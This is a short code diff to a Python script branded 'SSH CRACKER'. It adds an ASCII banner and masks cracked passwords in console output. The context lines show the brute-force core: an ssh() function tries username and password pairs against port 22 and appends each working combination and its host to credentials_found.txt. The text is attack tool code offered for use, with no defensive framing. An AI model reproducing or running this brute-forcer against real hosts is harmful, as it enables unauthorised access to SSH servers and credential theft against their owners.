@@ -8,6 +8,12 @@ import ipaddress
 import threading
 import time
 import logging
+import pyfiglet
+
+name = "SSH CRACKER"
+ascii_banner = pyfiglet.figlet_format(f"{name}")
+print(ascii_banner)
+
 for i in tqdm(range(10), colour="green", desc="loading software"):
     time.sleep(1.00)
 def ssh(host, username, password):
@@ -16,7 +22,7 @@ def ssh(host, username, password):
     try:
         ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
         with open("credentials_found.txt", "a") as fh:
-            print(f"{Fore.GREEN}Username - {username} and Password - {password} found.")
+            print(f"{Fore.GREEN}Username - {username} and Password - ******* found.")
             fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
     except AuthenticationException:
         print(f"{Fore.RED}Username - {username} and Password - {password} is Incorrect.")
